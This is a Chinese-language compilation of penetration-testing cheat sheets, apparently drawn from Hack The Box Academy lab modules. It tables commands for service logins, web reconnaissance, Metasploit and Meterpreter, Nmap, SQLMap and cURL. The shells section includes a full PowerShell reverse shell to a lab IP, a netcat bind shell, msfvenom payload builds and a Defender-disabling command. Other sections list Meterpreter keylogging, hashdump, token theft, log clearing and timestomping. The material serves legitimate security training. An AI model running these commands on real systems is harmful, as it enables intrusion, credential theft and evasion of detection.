| `xfreerdp /u:<user> /p:"<password>" /v:<FQDN/IP>` | 从 Linux 登录到 RDP 服务器。 |
| `evil-winrm -i <FQDN/IP> -u <user> -p <password>` | 登录到 WinRM 服务器。 |
| `wmiexec.py <user>:"<password>"@<FQDN/IP> "<system command>"` | 使用 WMI 服务执行命令。 |

##### Oracle TNS
|**命令**|**描述**|
|-|-|
| `./odat.py all -s <FQDN/IP>` | 执行各种扫描以收集有关 Oracle 数据库服务及其组件的信息。 |
| `sqlplus <user>/<pass>@<FQDN/IP>/<db>` | 登录到 Oracle 数据库。 |
| `./odat.py utlfile -s <FQDN/IP> -d <db> -U <user> -P <pass> --sysdba --putFile C:\\insert\\path file.txt ./file.txt` | 使用 Oracle RDBMS 上传文件。 |# Web 信息收集
## WHOIS

| **命令** | **描述** |
|-|-|
| `export TARGET="domain.tld"` | 将目标分配给环境变量。 |
| `whois $TARGET` | 查询目标的 WHOIS 信息。 |


---
## DNS 枚举

| **命令** | **描述** |
|-|-|
| `nslookup $TARGET` | 识别目标域名的 `A` 记录。 |
| `nslookup -query=A $TARGET` | 识别目标域名的 `A` 记录。 |
| `dig $TARGET @<nameserver/IP>` | 识别目标域名的 `A` 记录。  |
| `dig a $TARGET @<nameserver/IP>` | 识别目标域名的 `A` 记录。  |
| `nslookup -query=PTR <IP>` | 识别目标 IP 地址的 `PTR` 记录。 |
| `dig -x <IP> @<nameserver/IP>` | 识别目标 IP 地址的 `PTR` 记录。  |
| `nslookup -query=ANY $TARGET` | 识别目标域名的 `ANY` 记录。 |
| `dig any $TARGET @<nameserver/IP>` | 识别目标域名的 `ANY` 记录。 |
| `nslookup -query=TXT $TARGET` | 识别目标域名的 `TXT` 记录。 |
| `dig txt $TARGET @<nameserver/IP>` | 识别目标域名的 `TXT` 记录。 |
| `nslookup -query=MX $TARGET` | 识别目标域名的 `MX` 记录。 |
| `dig mx $TARGET @<nameserver/IP>` | 识别目标域名的 `MX` 记录。 |


---
## 被动子域名枚举

| **资源/命令** | **描述** |
|-|-|
| `VirusTotal` | [https://www.virustotal.com/gui/home/url](https://www.virustotal.com/gui/home/url) |
| `Censys` | [https://censys.io/](https://censys.io/) |
| `Crt.sh` | [https://crt.sh/](https://crt.sh/) |
| `curl -s https://sonar.omnisint.io/subdomains/{domain} \| jq -r '.[]' \| sort -u` | 获取指定域名的所有子域名。 |
| `curl -s https://sonar.omnisint.io/tlds/{domain} \| jq -r '.[]' \| sort -u` | 获取指定域名的所有 TLD（顶级域名）。 |
| `curl -s https://sonar.omnisint.io/all/{domain} \| jq -r '.[]' \| sort -u` | 获取指定域名在所有 TLD 下的所有结果。 |
| `curl -s https://sonar.omnisint.io/reverse/{ip} \| jq -r '.[]' \| sort -u` | 对 IP 地址进行反向 DNS 查询。 |
| `curl -s https://sonar.omnisint.io/reverse/{ip}/{mask} \| jq -r '.[]' \| sort -u` | 对 CIDR 范围进行反向 DNS 查询。 |
| `curl -s "https://crt.sh/?q=${TARGET}&output=json" \| jq -r '.[] \| "\(.name_value)\n\(.common_name)"' \| sort -u` | 证书透明度查询。 |
| `cat sources.txt \| while read source; do theHarvester -d "${TARGET}" -b $source -f "${source}-${TARGET}";done` | 在 source.txt 列表提供的来源中搜索子域名和其他信息。 |

#### Sources.txt
```txt
baidu
bufferoverun
crtsh
hackertarget
otx
projecdiscovery
rapiddns
sublist3r
threatcrowd
trello
urlscan
vhost
virustotal
zoomeye
```

---
## 被动基础设施识别

| **资源/命令** | **描述** |
|-|-|
| `Netcraft` | [https://www.netcraft.com/](https://www.netcraft.com/) |
| `WayBackMachine` | [http://web.archive.org/](http://web.archive.org/) |
| `WayBackURLs` | [https://github.com/tomnomnom/waybackurls](https://github.com/tomnomnom/waybackurls) |
| `waybackurls -dates https://$TARGET > waybackurls.txt` | 从域名爬取 URL 并记录获取日期。 |


---
## 主动基础设施识别

| **资源/命令** | **描述** |
|-|-|
| `curl -I "http://${TARGET}"` | 显示目标 Web 服务器的 HTTP 头信息。 |
| `whatweb -a https://www.facebook.com -v` | 技术识别。 |
| `Wappalyzer` | [https://www.wappalyzer.com/](https://www.wappalyzer.com/) |
| `wafw00f -v https://$TARGET` | WAF（Web 应用防火墙）指纹识别。 |
| `Aquatone` | [https://github.com/michenriksen/aquatone](https://github.com/michenriksen/aquatone) |
| `cat subdomain.list \| aquatone -out ./aquatone -screenshot-timeout 1000` | 对 subdomain.list 中的所有子域名进行截图。 |


---
## 主动子域名枚举

| **资源/命令** | **描述** |
|-|-|
| `HackerTarget` | [https://hackertarget.com/zone-transfer/](https://hackertarget.com/zone-transfer/) |
| `SecLists` | [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists) |
| `nslookup -type=any -query=AXFR $TARGET nameserver.target.domain` | 使用 Nslookup 对目标域名及其名称服务器进行区域传输。 |
| `gobuster dns -q -r "${NS}" -d "${TARGET}" -w "${WORDLIST}" -p ./patterns.txt -o "gobuster_${TARGET}.txt"` | 子域名暴力破解。 |


---
## 虚拟主机

| **资源/命令** | **描述** |
|-|-|
| `curl -s http://192.168.10.10 -H "Host: randomtarget.com"` | 修改 HOST HTTP 头以请求特定域名。 |
| `cat ./vhosts.list \| while read vhost;do echo "\n********\nFUZZING: ${vhost}\n********";curl -s -I http://<IP address> -H "HOST: ${vhost}.target.domain" \| grep "Content-Length: ";done` | 暴力破解目标域名上可能存在的虚拟主机。 |
| `ffuf -w ./vhosts -u http://<IP address> -H "HOST: FUZZ.target.domain" -fs 612` | 使用 `ffuf` 暴力破解目标域名上可能存在的虚拟主机。 |


---
## 爬虫

| **资源/命令** | **描述** |
|-|-|
| `ZAP` | [https://www.zaproxy.org/](https://www.zaproxy.org/) |
| `ffuf -recursion -recursion-depth 1 -u http://192.168.10.10/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt` | 发现无法通过浏览网站找到的文件和文件夹。
| `ffuf -w ./folders.txt:FOLDERS,./wordlist.txt:WORDLIST,./extensions.txt:EXTENSIONS -u http://www.target.domain/FOLDERS/WORDLISTEXTENSIONS` | 对目标 Web 服务器进行变异暴力破解。 |# MetaSploit
## MSFconsole 命令

| **命令**        | **描述**                                                  |
| :--------------- | :----------------------------------------------------------- |
| `show exploits` | 显示框架中的所有漏洞利用模块。                      |
| `show payloads`  | 显示框架中的所有 payload。                      |
| `show auxiliary` | 显示框架中的所有辅助模块。             |
| `search <name>` | 在框架中搜索漏洞利用模块或其他模块。         |
| `info`         | 加载特定漏洞利用模块或其他模块的信息。         |
| `use <name>` | 加载漏洞利用模块或其他模块（例如：use windows/smb/psexec）。 |
| `use <number>` | 使用 search <name> 命令后显示的索引号加载漏洞利用模块。 |
| `LHOST`        | 目标可达的本地主机 IP 地址，通常是公网 IP 地址（不在本地网络时）。通常用于反向 shell。 |
| `RHOST`        | 远程主机或目标。set 函数用于设置特定值（例如 LHOST 或 RHOST）。 |
| `setg <function>` | 全局设置特定值（例如 LHOST 或 RHOST）。 |
| `show options` | 显示模块或漏洞利用可用的选项。          |
| `show targets` | 显示漏洞利用支持的平台。                 |
| `set target <number>` | 如果知道操作系统和 Service Pack，则指定特定目标索引。 |
| `set payload <payload>` | 指定要使用的 payload。 |
| `set payload <number>` | 在 show payloads 命令后使用 payload 索引号指定要使用的 payload。 |
| `show advanced` | 显示高级选项。 |
| `set autorunscript migrate -f` | 漏洞利用完成后自动迁移到单独的进程。 |
| `check` | 确定目标是否容易受到攻击。 |
| `exploit` | 执行模块或漏洞利用并攻击目标。 |
| `exploit -j` | 在作业上下文中运行漏洞利用。（这将在后台运行漏洞利用。） |
| `exploit -z` | 成功利用后不与会话交互。 |
| `exploit -e <encoder>` | 指定要使用的 payload 编码器（例如：exploit –e shikata_ga_nai）。 |
| `exploit -h` | 显示 exploit 命令的帮助信息。 |
| `sessions -l` | 列出可用的会话（处理多个 shell 时使用）。 |
| `sessions -l -v` | 列出所有可用会话并显示详细字段，例如利用系统时使用的漏洞。 |
| `sessions -s <script>` | 在所有 Meterpreter 活动会话上运行特定的 Meterpreter 脚本。 |
| `sessions -K` | 终止所有活动会话。 |
| `sessions -c <cmd>` | 在所有活动 Meterpreter 会话上执行命令。 |
| `sessions -u <sessionID>` | 将普通 Win32 shell 升级为 Meterpreter 控制台。 |
| `db_create <name>` | 创建用于数据库驱动攻击的数据库（例如：db_create autopwn）。 |
| `db_connect <name>` | 创建并连接用于驱动攻击的数据库（例如：db_connect autopwn）。 |
| `db_nmap` | 使用 Nmap 并将结果放入数据库。（支持正常的 Nmap 语法，如 –sT –v –P0。） |
| `db_destroy` | 删除当前数据库。 |
| `db_destroy  <user:password@host:port/database>` | 使用高级选项删除数据库。 |
|                |                                                              |


----
## Meterpreter 命令

| **命令**                                                     | **描述**                                                  |
| :---------------------------------------------------------- | :----------------------------------------------------------- |
| `help`                                                      | 打开 Meterpreter 使用帮助。                                 |
| `run <scriptname>`                                        | 运行基于 Meterpreter 的脚本；完整列表请查看 scripts/meterpreter 目录。 |
| `sysinfo`                                                   | 显示被入侵目标的系统信息。       |
| `ls`                                                        | 列出目标上的文件和文件夹。                    |
| `use priv`                                                  | 加载权限扩展以获取扩展的 Meterpreter 库。 |
| `ps`                                                        | 显示所有正在运行的进程以及每个进程关联的账户。 |
| `migrate <proc. id>`                                      | 迁移到特定进程 ID（PID 是从 ps 命令获取的目标进程 ID）。 |
| `use incognito`                                             | 加载 incognito 功能。（用于目标机器上的令牌窃取和模拟。） |
| `list_tokens -u`                                            | 按用户列出目标上可用的令牌。                 |
| `list_tokens -g`                                            | 按组列出目标上可用的令牌。                |
| `impersonate_token <DOMAIN_NAMEUSERNAME>`               | 模拟目标上可用的令牌。                 |
| `steal_token <proc. id>`                                  | 窃取给定进程可用的令牌并模拟该令牌。 |
| `drop_token`                                                | 停止模拟当前令牌。                        |
| `getsystem`                                                 | 尝试通过多种攻击向量将权限提升到 SYSTEM 级别访问。 |
| `shell`                                                     | 进入具有所有可用令牌的交互式 shell。    |
| `execute -f <cmd.exe> -i`                                 | 执行 cmd.exe 并与其交互。                        |
| `execute -f <cmd.exe> -i -t`                              | 使用所有可用令牌执行 cmd.exe。                   |
| `execute -f <cmd.exe> -i -H -t`                           | 使用所有可用令牌执行 cmd.exe 并使其成为隐藏进程。 |
| `rev2self`                                                  | 恢复到用于入侵目标的原始用户。 |
| `reg <command>`                                           | 在目标注册表中进行交互、创建、删除、查询、设置等操作。 |
| `setdesktop <number>`                                     | 根据登录用户切换到不同的屏幕。      |
| `screenshot`                                                | 截取目标屏幕的屏幕截图。                    |
| `upload <filename>`                                       | 上传文件到目标。                                 |
| `download <filename>`                                     | 从目标下载文件。                             |
| `keyscan_start`                                             | 开始在远程目标上嗅探键盘输入。              |
| `keyscan_dump`                                              | 导出在目标上捕获的远程按键。                 |
| `keyscan_stop`                                              | 停止在远程目标上嗅探键盘输入。               |
| `getprivs`                                                  | 在目标上获取尽可能多的权限。            |
| `uictl enable <keyboard/mouse>`                           | 控制键盘和/或鼠标。                   |
| `background`                                                | 在后台运行当前 Meterpreter shell。        |
| `hashdump`                                                  | 导出目标上的所有哈希值。use sniffer 加载嗅探器模块。 |
| `sniffer_interfaces`                                        | 列出目标上可用的接口。                 |
| `sniffer_dump <interfaceID> pcapname`                     | 开始在远程目标上嗅探。                         |
| `sniffer_start <interfaceID> packet-buffer`               | 使用特定范围的数据包缓冲区开始嗅探。    |
| `sniffer_stats <interfaceID>`                             | 从正在嗅探的接口获取统计信息。 |
| `sniffer_stop <interfaceID>`                              | 停止嗅探器。                                            |
| `add_user <username> <password> -h <ip>`              | 在远程目标上添加用户。                             |
| `add_group_user <"Domain Admins"> <username> -h <ip>` | 在远程目标上将用户名添加到 Domain Administrators 组。 |
| `clearev`                                                   | 清除目标机器上的事件日志。                   |
| `timestomp`                                                 | 更改文件属性，例如创建日期（反取证措施）。 |
| `reboot`                                                    | 重启目标机器。                                   |
|                                                             |                                                              |
# NMAP
## 扫描选项

| **Nmap 选项** | **描述** |
|---|----|
| `10.10.10.0/24` | 目标网络范围。 |
| `-sn` | 禁用端口扫描。 |
| `-Pn` | 禁用 ICMP Echo 请求。 |
| `-n` | 禁用 DNS 解析。 |
| `-PE` | 使用 ICMP Echo 请求对目标执行 ping 扫描。 |
| `--packet-trace` | 显示所有发送和接收的数据包。 |
| `--reason` | 显示特定结果的原因。 |
| `--disable-arp-ping` | 禁用 ARP Ping 请求。 |
| `--top-ports=<num>` | 扫描已定义为最常见的指定数量的顶级端口。  |
| `-p-` | 扫描所有端口。 |
| `-p22-110` | 扫描 22 到 110 之间的所有端口。 |
| `-p22,25` | 仅扫描指定的端口 22 和 25。 |
| `-F` | 扫描前 100 个端口。 |
| `-sS` | 执行 TCP SYN 扫描。 |
| `-sA` | 执行 TCP ACK 扫描。 |
| `-sU` | 执行 UDP 扫描。 |
| `-sV` | 扫描已发现服务的版本信息。 |
| `-sC` | 使用归类为 "default" 的脚本执行脚本扫描。 |
| `--script <script>` | 使用指定脚本执行脚本扫描。 |
| `-O` | 执行操作系统检测扫描以确定目标的操作系统。 |
| `-A` | 执行操作系统检测、服务检测和 traceroute 扫描。 |
| `-D RND:5` | 设置用于扫描目标的随机诱饵数量。 |
| `-e` | 指定用于扫描的网络接口。 |
| `-S 10.10.10.200` | 指定扫描的源 IP 地址。 |
| `-g` | 指定扫描的源端口。 |
| `--dns-server <ns>` | 使用指定的名称服务器执行 DNS 解析。 |




## 输出选项


| **Nmap 选项** | **描述** |
|---|----|
| `-oA filename` | 以所有可用格式存储结果，文件名以 "filename" 开头。 |
| `-oN filename` | 以正常格式存储结果，文件名为 "filename"。 |
| `-oG filename` | 以 "grepable" 格式存储结果，文件名为 "filename"。 |
| `-oX filename` | 以 XML 格式存储结果，文件名为 "filename"。 |



## 性能选项

| **Nmap 选项** | **描述** |
|---|----|
| `--max-retries <num>` | 设置特定端口扫描的重试次数。 |
| `--stats-every=5s` | 每 5 秒显示扫描状态。 |
| `-v/-vv` | 在扫描期间显示详细输出。 |
| `--initial-rtt-timeout 50ms` | 设置指定时间值作为初始 RTT 超时。 |
| `--max-rtt-timeout 100ms` | 设置指定时间值作为最大 RTT 超时。 |
| `--min-rate 300` | 设置同时发送的数据包数量。 |
| `-T <0-5>` | 指定特定的时间模板。 |

#nmap #hacking #cheatsheet #shell #webshell #payload #cheatsheet

# Shells 和 Payloads
|   |   |
|---|---|
|`xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!`|基于 CLI 的工具，用于使用远程桌面协议连接到 Windows 目标|
|`env`|与许多不同的命令语言解释器配合使用，用于发现系统的环境变量。这是找出正在使用哪种 shell 语言的好方法|
|`sudo nc -lvnp <port #>`|在指定端口启动 `netcat` 监听器|
|`nc -nv <ip address of computer with listener started><port being listened on>`|连接到指定 IP 地址和端口的 netcat 监听器|
|`rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/bash -i 2>&1 \| nc -l 10.129.41.200 7777 > /tmp/f`|使用 netcat 将 shell (`/bin/bash`) 绑定到指定的 IP 地址和端口。这允许将 shell 会话远程提供给连接到此命令所在计算机的任何人|
|`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535\|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 \| Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`|用于连接回攻击机上已启动的监听器的 `Powershell` 一行命令|
|`Set-MpPreference -DisableRealtimeMonitoring $true`|用于禁用 `Windows Defender` 实时监控的 Powershell 命令|
|`use exploit/windows/smb/psexec`|可用于易受攻击的 Windows 系统的 Metasploit 漏洞利用模块，使用 `smb` 和 `psexec` 建立 shell 会话|
|`shell`|在 meterpreter shell 会话中使用的命令，用于进入 `system shell`|
|`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf`|用于生成基于 Linux 的反向 shell `无阶段 payload` 的 `MSFvenom` 命令|
|`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > nameoffile.exe`|用于生成基于 Windows 的反向 shell 无阶段 payload 的 MSFvenom 命令|
|`msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f macho > nameoffile.macho`|用于生成基于 MacOS 的反向 shell payload 的 MSFvenom 命令|
|`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.113 LPORT=443 -f asp > nameoffile.asp`|用于生成 ASP Web 反向 shell payload 的 MSFvenom 命令|
|`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f raw > nameoffile.jsp`|用于生成 JSP Web 反向 shell payload 的 MSFvenom 命令|
|`msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f war > nameoffile.war`|用于生成兼容 WAR java/jsp 的 Web 反向 shell payload 的 MSFvenom 命令|
|`use auxiliary/scanner/smb/smb_ms17_010`|用于检查主机是否容易受到 `ms17_010` 攻击的 Metasploit 漏洞利用模块|
|`use exploit/windows/smb/ms17_010_psexec`|用于在易受 ms17_010 攻击的基于 Windows 的系统上获取反向 shell 会话的 Metasploit 漏洞利用模块|
|`use exploit/linux/http/rconfig_vendors_auth_file_upload_rce`|可用于在托管 `rConfig 3.9.6` 的易受攻击的 Linux 系统上获取反向 shell 的 Metasploit 漏洞利用模块|
|`python -c 'import pty; pty.spawn("/bin/sh")'`|用于在基于 Linux 的系统上生成 `交互式 shell` 的 Python 命令|
|`/bin/sh -i`|在基于 Linux 的系统上生成交互式 shell|
|`perl —e 'exec "/bin/sh";'`|使用 `perl` 在基于 Linux 的系统上生成交互式 shell|
|`ruby: exec "/bin/sh"`|使用 `ruby` 在基于 Linux 的系统上生成交互式 shell|
|`Lua: os.execute('/bin/sh')`|使用 `Lua` 在基于 Linux 的系统上生成交互式 shell|
|`awk 'BEGIN {system("/bin/sh")}'`|使用 `awk` 命令在基于 Linux 的系统上生成交互式 shell|
|`find / -name nameoffile 'exec /bin/awk 'BEGIN {system("/bin/sh")}' \;`|使用 `find` 命令在基于 Linux 的系统上生成交互式 shell|
|`find . -exec /bin/sh \; -quit`|使用 `find` 命令在基于 Linux 的系统上生成交互式 shell 的另一种方法|
|`vim -c ':!/bin/sh'`|使用文本编辑器 `VIM` 生成交互式 shell。可用于逃离"jail-shells"（受限 shell）|
|`ls -la <path/to/fileorbinary>`|用于在基于 Linux 的系统上 `列出` 文件和目录，并显示所选目录中每个文件的权限。可用于查找我们有权执行的二进制文件|
|`sudo -l`|显示当前登录用户可以作为 `sudo` 运行的命令|
|`/usr/share/webshells/laudanum`|ParrotOS 和 Pwnbox 上 `laudanum webshells` 的位置|
|`/usr/share/nishang/Antak-WebShell`|Parrot OS 和 Pwnbox 上 `Antak-Webshell` 的位置|
# SQLMap
| **命令**                                                  | **描述**                                             |
| ------------------------------------------------------------ | ----------------------------------------------------------- |
| `sqlmap -h`                                                  | 查看基本帮助菜单                                    |
| `sqlmap -hh`                                                 | 查看高级帮助菜单                                 |
| `sqlmap -u "http://www.example.com/vuln.php?id=1" --batch`   | 运行 `SQLMap` 而无需请求用户输入                  |
| `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`  | 使用 POST 请求的 `SQLMap`                                  |
| `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'` | 使用星号指定注入点的 POST 请求 |
| `sqlmap -r req.txt`                                          | 将 HTTP 请求文件传递给 `SQLMap`                    |
| `sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'` | 指定 cookie 头                                  |
| `sqlmap -u www.target.com --data='id=1' --method PUT`        | 指定 PUT 请求                                    |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt` | 将流量存储到输出文件                             |
| `sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch` | 指定详细级别                                     |
| `sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"` | 指定前缀或后缀                               |
| `sqlmap -u www.example.com/?id=1 -v 3 --level=5`             | 指定级别和风险                               |
| `sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba` | 基本数据库枚举                                        |
| `sqlmap -u "http://www.example.com/?id=1" --tables -D testdb` | 表枚举                                           |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname` | 表/行枚举                                       |
| `sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"` | 条件枚举                                     |
| `sqlmap -u "http://www.example.com/?id=1" --schema`          | 数据库模式枚举                                 |
| `sqlmap -u "http://www.example.com/?id=1" --search -T user`  | 搜索数据                                          |
| `sqlmap -u "http://www.example.com/?id=1" --passwords --batch` | 密码枚举和破解                           |
| `sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"` | 绕过 Anti-CSRF 令牌                                      |
| `sqlmap --list-tampers`                                      | 列出所有 tamper 脚本                                     |
| `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba` | 检查 DBA 权限                                    |
| `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"` | 读取本地文件                                        |
| `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"` | 写入文件                                              |
| `sqlmap -u "http://www.example.com/?id=1" --os-shell`        | 生成操作系统 shell                                        |

#sqlmap #sqli #hacking #cheatsheet # Web 请求
## cURL

| **命令** | **描述** |
| --------------|-------------------|
| `curl -h` | cURL 帮助菜单 |
| `curl inlanefreight.com` | 基本 GET 请求 |
| `curl -s -O inlanefreight.com/index.html` | 下载文件 |
| `curl -k https://inlanefreight.com` | 跳过 HTTPS (SSL) 证书验证 |
| `curl inlanefreight.com -v` | 打印完整的 HTTP 请求/响应详情 |
| `curl -I https://www.inlanefreight.com` | 发送 HEAD 请求（仅打印响应头） |
| `curl -i https://www.inlanefreight.com` | 打印响应头和响应体 |
| `curl https://www.inlanefreight.com -A 'Mozilla/5.0'` | 设置 User-Agent 头 |
| `curl -u admin:admin http://<SERVER_IP>:<PORT>/` | 设置 HTTP 基本认证凭据 |
| `curl  http://admin:admin@<SERVER_IP>:<PORT>/` | 在 URL 中传递 HTTP 基本认证凭据 |
| `curl -H 'Authorization: Basic YWRtaW46YWRtaW4=' http://<SERVER_IP>:<PORT>/` | 设置请求头 |
| `curl 'http://<SERVER_IP>:<PORT>/search.php?search=le'` | 传递 GET 参数 |
| `curl -X POST -d 'username=admin&password=admin' http://<SERVER_IP>:<PORT>/` | 发送带有 POST 数据的 POST 请求 |
| `curl -b 'PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1' http://<SERVER_IP>:<PORT>/` | 设置请求 cookie |
| `curl -X POST -d '{"search":"london"}' -H 'Content-Type: application/json' http://<SERVER_IP>:<PORT>/search.php` | 发送带有 JSON 数据的 POST 请求 |

## APIs
| **命令** | **描述** |
| --------------|-------------------|
| `curl http://<SERVER_IP>:<PORT>/api.php/city/london` | 读取条目 |
| `curl -s http://<SERVER_IP>:<PORT>/api.php/city/ \| jq` | 读取所有条目 |
| `curl -X POST http://<SERVER_IP>:<PORT>/api.php/city/ -d '{"city_name":"HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'` | 创建（添加）条目 |
| `curl -X PUT http://<SERVER_IP>:<PORT>/api.php/city/london -d '{"city_name":"New_HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'` | 更新（修改）条目 |
| `curl -X DELETE http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City` | 删除条目 |

## 浏览器开发者工具

| **快捷键** | **描述** |
| --------------|-------------------|
| [`CTRL+SHIFT+I`] 或 [`F12`] | 显示开发者工具 |
| [`CTRL+SHIFT+E`] | 显示网络标签页 |
